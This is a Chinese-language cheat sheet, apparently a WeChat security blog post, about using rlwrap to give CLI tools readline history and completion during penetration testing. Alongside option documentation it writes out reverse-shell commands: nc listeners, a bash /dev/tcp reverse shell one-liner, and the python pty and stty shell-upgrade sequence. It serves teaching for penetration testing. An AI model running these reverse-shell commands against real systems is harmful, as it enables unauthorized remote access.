---
title: rlwrap用法速查
url: https://mp.weixin.qq.com/s/XmdCXeg86N63uCE8UMHgaA
source: Doonsec's feed
date: 2026-10-28
fetch_date: 2026-10-29T07:49:49.487991
---

# rlwrap用法速查

# rlwrap用法速查

原创

泷羽Sec静安
泷羽Sec静安

泷羽Sec-静安

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> 一个让任何 CLI 工具都"自带 GNU readline 体验"的小工具。**对渗透测试来说几乎是必备**——尤其是 `nc` 反弹 shell、有限的 `sh`/`python` 提权 shell、各种不支持 readline 的客户端（smbclient、sqlmap 交互模式、某些自定义工具）。

---

## 1. 解决的痛点

**问题**：很多 CLI 工具不接 readline，交互模式下用方向键会被当成"垃圾字符"原样回显到屏幕上：

```
$ nc -lvnp 80
listening on [any] 80 ...
^[[D^[[D^[[C  ←  ← ↑ ↑ → 这些 ANSI 转义序列
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpOqVE32FfeUH8gv65gSapGOgVJXicGGPeUibbxqqGBG3GblViaT0npXwdeliaiawiaVD4tTrWmdpGDia9ibg5YDkXD1tAYAnapIoUic29EI/640?wx_fmt=png&from=appmsg)
> 注：上例里 `^[` 是 ESC（0x1B），完整序列是 `ESC [ D`（左箭头）、`ESC [ A`（上箭头）、`ESC [ C`（右箭头），bash 终端能解释但被 nc 之类的程序吐到屏幕上。

**rlwrap 干的事**：包一层，**拦截 stdin 的转义序列 → 转成 readline 的历史/补全操作**：

```
$ rlwrap nc -lvnp 80
listening on [any] 80 ...   ← 干净，没有任何 ^[ 字符
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpNOYhcNKJJwZxNAsgKxedLeELCSuMcCUgAwbeqnqic9oicSQucwZmiaQENTjWPsCicQYVndWCHOBN8sO2ZOwUE4RicKb9wPicoq2FviaQ/640?wx_fmt=png&from=appmsg)
> 顺便还能用 ↑ ↓ 翻历史命令、Tab 补全（自定义词表）、Ctrl-R 反向搜索历史。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpPiaAYS7YbDBmokom22ZPZFPhZ0Bhs8qqehiba9JicM7MYg6s7yuxtjWotyRj6mtJZvxpMxdiaibhV9xJFRe3hh1LPicKBbthTtj9GYE/640?wx_fmt=png&from=appmsg)
大多数情况tab补全是不支持的，主要就是上下切换比较方便。

---

## 2. 基础用法

```
# 语法：rlwrap <要包装的命令> [参数...]
rlwrap nc -lvnp 80
rlwrap nc -nv 10.10.10.10 4444
rlwrap python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**任何命令都能包**，不只是 nc。rlwrap 通过 `exec` 启动子进程，把自己的 stdin/stdout 桥接到子进程的 stdin/stdout，自己在中间做 readline 转换。

---

## 3. 渗透测试高频用法

### 3.1 反弹 shell 监听器（**最经典**）

```
rlwrap nc -lvnp 80
```

* • 监听 80 端口拿到的 shell 里能翻历史命令（上一条 `id`、上上一条 `cat /etc/passwd`）
* • 配合 `-k` 可以保持监听并继续接新连接

### 3.2 主动连出去的 nc / telnet

```
rlwrap nc -nv 10.10.10.10 4444
rlwrap telnet 10.10.10.10 23
```

某些服务（POP3、SMTP、Redis 旧版等）支持交互命令但不带 readline，rlwrap 一包就舒服了。

### 3.3 升级"贫瘠"的 shell

拿到 `sh` 反弹但没法用 Tab 补全、没法翻历史时：

```
# 用 python pty 升级 → 拿到一个伪 TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 但这个伪 TTY 仍然不带 readline
# 外面再套一层 rlwrap
```

更好的做法（**完整 TTY + 历史**）：

```
# 攻击机上：先开 rlwrap 监听
rlwrap nc -lvnp 80

# 拿到 sh 后立刻升级
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z 挂起
stty raw -echo; fg
# 重新回到 nc
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpPG37vSYgyJ37ic7pSClOJlgg3uZ2Ik2g1oJGf7JuzUKLCWNhNn5e1gY42cwXwzgwUvkxoF6BTYVKEloTGnlEvDAGtYjW5D9ic1M/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpOxQ6BQ1yLAhOuLbzGiaecBYzmCm48u1qILDXHUFfO3ib662ia9WARJyS51tzU2LNoaxFqJRr2utdduxZjtAnPIx3EOpS7MMZRpiaE/640?wx_fmt=png&from=appmsg)

### 3.4 各种交互客户端

```
rlwrap smbclient //10.10.10.10/C$ -U Administrator
rlwrap mysql -u root -p -h 10.10.10.10
rlwrap redis-cli -h 10.10.10.10
rlwrap psql -U postgres -h 10.10.10.10
```

很多 SQL 客户端其实自带 readline，**但**在通过 pipe 拉起来或 PTY 不完整时可能失效——`rlwrap` 是保险措施。

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpMwEbquuPVicLMhlzvVL4VU0c6otTSRNFibYTKO48YhLXZ5GALOhdKMibeRmk6nia93Ew66ogq4EgsHoR5nsb4meciaiaZXzh6Jw267M/640?wx_fmt=png&from=appmsg)

依旧是可以上下切换

---

## 4. 常用选项

### 4.1 历史

```
# -H, --history-filename：指定历史文件（默认 ~/.rlwrap_history_<命令名>）
rlwrap -H /tmp/nc_history nc -lvnp 80

# -S, --histsize：历史条数（默认 300）
rlwrap -S 1000 nc -lvnp 80

# -N, --no-history：禁用历史
rlwrap -N nc -nv 10.10.10.10 4444

# -w, --wait-timeout：readline 超时毫秒（默认无超时）
rlwrap -w 5000 nc -lvnp 80
```

### 4.2 补全

```
# -f, --file：补全词表文件（每行一个候选词）
rlwrap -f /usr/share/wordlists/common.txt nc -nv 10.10.10.10

# -i, --casesensitive：补全是否区分大小写（默认不区分）
rlwrap -i nc -lvnp 80

# -a, --always-readline：连非 TTY 输入也走 readline（管道/重定向时）
rlwrap -a command < input.txt

# -c, --complete-filenames：启用文件名补全
rlwrap -c custom_tool

# -b, --break-chars：定义"词边界"字符（决定 Tab 怎么分词）
rlwrap -b '(){}[],. ' custom_tool

# -r, --remember：记忆用户的输入作为补全候选（学过的词下次能补全）
rlwrap -r nc -lvnp 80
```

![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpOz7TtSCTNornSmfs3dRQM9z4wOHyC5iaZOs9xcHCPhlWl17b7blicQUMhL930icics23T1vJqByWuF2sJQ8ytVvPfeWWE5Z6I8EDY/640?wx_fmt=png&from=appmsg)![](https://mmbiz.qpic.cn/mmbiz_png/teQhPZBEOpPMLblfoEh9W4qYT1d4tV3rfnVeWc4nNBPKNQr4ricbUKyHticEm7Vic0oxCk6mlZf93uQibMBOXsTltAwQ7cOaZlbpY1MKREoTHpY/640?wx_fmt=png&from=appmsg)

### 4.3 输入过滤 / 安全

```
# -z, --filter：过滤掉某些字符（防意外粘贴的二进制乱码 / ANSI 转义）
rlwrap -z 'badword' nc -lvnp 80

# --no-warnings：静默某些错误
rlwrap --no-warnings nc -lvnp 80
```

### 4.4 提示与外观

```
# -P, --pre-given：提示符（给被包装的命令用的 PS1）
rlwrap -P 'maltrail> ' ./tool

# -p, --prompt-color：提示符颜色
rlwrap -p '[1;32;40mcmd> ' nc -lvnp 80

# --quote-characters -q：哪些字符触发"引号配对"模式（避免 SQL 字符串里读不完整）
rlwrap -q '"'\' mysql ...
```

### 4.5 调试 / 高级

```
# --no-children：不 fork 子进程（调试用）
rlwrap --no-children nc -lvnp 80

# -V, --version：看版本
rlwrap -V

# -h, --help：完整选项
rlwrap -h
```

---

## 5. 实战小技巧

### 5.0 一句话让反弹的渣渣shell也能有顺滑的终端体验

**监听端**

```
rlwrap -a -r -c -H ~/.rlwrap_revsh_history -pred nc -lvnp 8848
```

**靶机反弹shell**

bash

```
bash -c 'sh -i >& /dev/tcp/127.0.0.1/8848 0>&1'
```

**回监听端 看**：应出现远端的 `$` 或 `user@linux:~$` ，且应该是**红色**。连上之前和之后是两种状态。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/teQhPZBEOpPlic0Mic5zsLbCkzOdYrPwUCQ8VEbS6DyPd7YSicSUFCZlFO7ct0BCYLaPvHptMibUxiaMUqy07n1eliaNORYzhgMcIOCaLg5LQhUEM/640?wx_fmt=png&from=appmsg)

### 5.1 用 `stty` + `rlwrap` 拿"完整 TTY" 反弹 shell

```
# === 攻击机 ===
rlwrap nc -lvnp 80

# === 反弹后，靶机里 ===
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z（挂起到攻击机 nc 里）
stty raw -echo
fg
# 回车后回到靶机 shell，现在有：Tab 补全 + 历史 + Ctrl-C 中断 + Ctrl-L 清屏
```

> 完整 TTY 是 `rlwrap` + `stty raw -echo; fg` + python pty 的组合拳，缺一不可。

### 5.2 找历史文件位置

```
ls -la ~/.rlwrap_history_*
# 或
ls -la ~/.rlwrap/
```

历史是**按被包装的命令名**自动分文件的：

```
~/.rlwrap_history_nc
~/.rlwrap_history_python
~/.rlwrap_history_mysql
```

想清空某次操作的历史：直接删对应文件。

### 5.3 配合 vim 风格快捷键

rlwrap 默认是 emacs 风格（Ctrl-A 到行首、Ctrl-E 到行尾、Ctrl-F/B 移光标）。可以切到 vi 模式：

```
# 临时（只对这次 rlwrap 会话生效）
rlwrap --setenv='INPUTRC=~/.inputrc_vi' nc -lvnp 80

# 永久：在 ~/.inputrc 里加
set editing-mode vi
```

### 5.4 配补全词表提效

把常用命令写进文件：

```
cat > /tmp/oscp_cmds.txt << 'EOF'
nmap
nc
ncat
sqlmap
nikto
gobuster
hydra
john
hashcat
msfconsole
searchsploit
curl
wget
python3
EOF

rlwrap -f /tmp/oscp_cmds.txt -i bash
```

> `bash` 自带 readline 这个其实意义不大，但**对**各种**自定义工具**就有用了。

### 5.5 防 ESC 转义意外触发 readline

如果你的工具原本的输出里有大量 ESC 序列（颜色、终端控制），rlwrap 可能误读成用户输入。可以用 `-z` 过滤：

```
# 把所有 ESC 字符从输出里剥掉（但保留给程序自己）
rlwrap -z '\x1b' nc ...
```

---

## 6. 安装

> https://github.com/hanslub42/rlwrap

| 系统 | 命令 |
| --- | --- |
| Kali / Debian | `sudo apt install rlwrap` |
| Ubuntu | `sudo apt install rlwrap` |
| CentOS / RHEL | `sudo yum install epel-release && sudo yum install rlwrap` |
| Arch | `sudo pacman -S rlwrap` |
| macOS (Homebrew) | `brew install rlwrap` |
| 源码 | `git clone https://github.com/hanslub42/rlwrap && cd rlwrap && autoreconf -i && ./configure && make && sudo make install` |

> Kali 默认就装了。**首次启动可能 warn `libreadline` 版本不匹配**，但实际不影响使用，加 `--no-warnings` 屏蔽。

---

## 7. 为什么 OSCP / 实战离不开它

* • 拿 `sh` 反弹没有方向键 → **rlwrap**
* • nc 监听器有几百条历史命令 → **rlwrap**
* • smbclient / mysql 交互不带 readline → **rlwrap**
* • 自定义 exp 工具靠 stdin 反复输 payload → **rlwrap**
* • 想升级到完整 TTY 又不想记 stty 三板斧 → **rlwrap + python pty + stty raw -echo; fg**

> **一句话总结**：任何"在终端里能让你按 ↑ 翻命令、按 Tab 补全"的需求，如果那个程序自己不支持，**套一层 `rlwrap` 就有了**。

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/jhBO4w8SLibW5p6wbicQ0VW9SdZ5W8ZWkqe9tVTwyQgoXibAE7B1CTqg3xb7Cficq1keBssjNq9n4uR4OxLWgVDU3w/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过